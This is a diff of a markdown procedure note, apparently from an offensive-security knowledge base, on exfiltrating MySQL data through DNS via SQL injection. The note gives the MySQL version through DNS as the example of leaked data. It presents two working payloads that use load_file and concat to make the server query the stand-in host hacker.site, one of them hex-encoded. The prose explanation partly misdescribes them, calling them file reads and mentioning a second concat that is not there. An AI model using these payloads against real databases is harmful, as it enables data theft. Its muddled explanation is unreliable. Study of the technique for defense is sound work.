@@ -41,6 +41,8 @@ Technical Explanation: MYSQL Injection is a technique used to exploit a vulnerab
 
 Business Value: This procedure can be used by attackers to steal sensitive data from a MYSQL database. This can result in financial losses, reputational damage, and legal liabilities for the victim organization.
 
+ 
+
 ## Requirements
 
 1. Access to a MYSQL database
@@ -48,6 +50,8 @@ Business Value: This procedure can be used by attackers to steal sensitive data 
 1. Knowledge of SQL Injection techniques
 
 1. Ability to send DNS requests
+
+ 
 
 ## Defense
 
@@ -57,19 +61,31 @@ Business Value: This procedure can be used by attackers to steal sensitive data 
 
 1. Implement DNS security measures, such as DNSSEC and DNS filtering, to prevent DNS Exfiltration
 
+ 
+
 ## Objectives
 
 1. Retrieve sensitive data from a MYSQL database
 
 1. Exfiltrate the data through DNS requests
 
+ 
+
 # Instructions
 
 1. Use SQL Injection to retrieve data from a file.
 
+ 
+
+
+
 **Code**: [[select load_file(concat('\\\\',version(),'.hacker.]]
 
+
+
 > This command allows an attacker to retrieve data from a file using SQL injection. The 'load_file' function is used to read the contents of a file and return it as a string. The 'concat' function is used to construct the file path and name. The first 'concat' function constructs the file path using the 'version()' function to retrieve the MySQL version number and the '.hacker.site' domain name. The second 'concat' function constructs the file path using the hexadecimal values of the backslash, the 'version()' function, the '.hacker.site' domain name, and the file name 'a.txt'. This command can be used to retrieve sensitive information such as passwords, configuration files, and other sensitive data stored in files.
+
+
 
 **Command** ([[Load file from remote server]]):
 
@@ -77,11 +93,17 @@ Business Value: This procedure can be used by attackers to steal sensitive data 
 select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
 ```
 
+
+
+
+
 **Command** ([[Load file with hexadecimal values]]):
 
 ```bash
 select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -107,3 +129,5 @@ select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e7
 - [[DNS exfiltration]]
 - [[MYSQL Injection]]
 - [[MYSQL Out of band]]
+
+
